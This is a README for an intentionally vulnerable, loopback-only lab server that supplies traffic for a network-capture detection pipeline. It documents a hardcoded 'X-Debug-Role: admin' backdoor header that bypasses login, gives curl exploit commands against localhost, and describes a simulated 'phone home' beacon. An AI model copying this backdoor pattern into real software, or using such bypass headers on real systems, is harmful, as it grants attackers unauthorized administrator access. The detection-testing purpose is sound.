# admin-backdoor-header

⚠️ **Intentionally vulnerable — local lab only.** This server is deliberately
broken so the repo's network capture / NCER causal-reconciliation pipeline
(`pkg/ncer`, Rust `omnisec-mitm`) has real traffic to detect. It binds to
`127.0.0.1` only and must never be exposed, reused, or deployed anywhere
else.

## Vulnerability: CWE-798 — Use of Hard-coded Credentials (backdoor header)

The server has a normal username/password login flow (`POST /login`) that
issues a real session token. But every "authenticated-looking" endpoint
*also* silently accepts a hardcoded magic request header instead of a valid
session:

```
X-Debug-Role: admin
```

Any request carrying that exact header/value pair is treated as a fully
authenticated administrator — no login call, no password, no session token,
no cookie required. This simulates a real incident class: a debug/ops
bypass header left wired into production auth middleware (see
`isBackdoorHeader` in `logic.go` and `(*server).authenticate` in `main.go`).

The check is intentionally evaluated *before*, and *instead of*, the real
session lookup, so it silently overrides normal role enforcement on
`GET /api/admin/dashboard` (which otherwise requires `role = admin` from a
real session).

Every time the backdoor path is taken, the server:
- logs loudly to stdout, prefixed `[BACKDOOR USED]`, with the remote address
  and timestamp; and
- if `TRACKER_URL` is set, fires a best-effort, fire-and-forget async
  `POST` of `{"event":"backdoor_used","path":"..."}` to that URL (2s
  timeout, errors ignored, never blocks the response) — simulating the
  backdoor "phoning home".

## Endpoints

| Method | Path                     | Auth                                          |
|--------|--------------------------|------------------------------------------------|
| POST   | `/login`                 | none (username + password in JSON body)        |
| GET    | `/api/me`                | session token **or** the backdoor header        |
| GET    | `/api/admin/dashboard`   | session token with `role=admin` **or** the backdoor header (bug) |

## Running

```sh
export DATABASE_URL='postgres://labs:labs_lab_pw@127.0.0.1:55432/labs_admin_backdoor_header?sslmode=disable'
export LISTEN_ADDR='127.0.0.1:18001'   # default
go run .
```

Schema + seed data: `labs/servers/db/postgres/init/01-admin-backdoor-header.sql`
(seeds a `user`, a `moderator`, and an `admin` account with fake local-only
passwords documented in that file).

## Exploit

Skip the login flow entirely and go straight to the admin dashboard using
only the hardcoded header:

```sh
curl -s -H 'X-Debug-Role: admin' http://127.0.0.1:18001/api/admin/dashboard
```

This returns `200 OK` with the admin dashboard payload even though no
`Authorization` header, session token, or password was ever presented.
Compare with the legitimate (and correctly-gated) path:

```sh
# Normal user cannot reach the admin dashboard, even after a real login:
TOKEN=$(curl -s -X POST http://127.0.0.1:18001/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"correcthorsebatterystaple"}' | jq -r .token)

curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:18001/api/admin/dashboard
# -> 403 Forbidden

curl -s -H 'X-Debug-Role: admin' http://127.0.0.1:18001/api/admin/dashboard
# -> 200 OK, full admin dashboard, no credentials at all
```

## What the ncer/mitm pipeline should flag

A plaintext HTTP request to `/api/admin/dashboard` (or `/api/me`) carrying
the header `X-Debug-Role: admin` with **no** `Authorization` header and no
prior `POST /login` in the session's causal history is the network evidence
this lab produces. The pipeline should be able to:

- capture the request/response pair via the MITM interceptor,
- notice the absence of a preceding successful `/login` in the reconciled
  causal chain for that admin-privileged response, and
- flag the hardcoded header as an authority-bypass / anomalous-privilege
  event (a live instance of the CWE-798 backdoor-header incident class).

## Docker

```sh
docker build -t labs-admin-backdoor-header .
```

`docker-compose` port mapping (host stays loopback-only):

```yaml
services:
  admin-backdoor-header:
    build: .
    ports:
      - "127.0.0.1:18001:18001"
    environment:
      DATABASE_URL: postgres://labs:labs_lab_pw@postgres:5432/labs_admin_backdoor_header?sslmode=disable
```

## Tests

```sh
go test ./... -v
```

Tests run entirely against an in-memory `memStore` fake (see
`memstore_test.go`) — no live Postgres is required.
